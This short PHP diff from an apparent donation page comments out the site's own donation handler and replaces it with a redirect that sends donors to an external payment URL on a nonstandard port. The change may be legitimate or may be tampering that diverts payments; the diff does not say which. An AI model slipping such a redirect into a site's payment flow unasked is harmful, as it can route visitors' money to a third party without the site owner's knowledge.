@@ -1,6 +1,7 @@
 <?php
 if (isset($_POST['button_donate'])) :
-    $this->donate_model->getDonate($_POST['button_donate']);
+    // $this->donate_model->getDonate($_POST['button_donate']);
+    header("Location: http://yc.238cs.com:88/pay/qhbg");
 endif; ?>
 
 <section class="uk-section uk-section-xsmall uk-padding-remove slider-section">
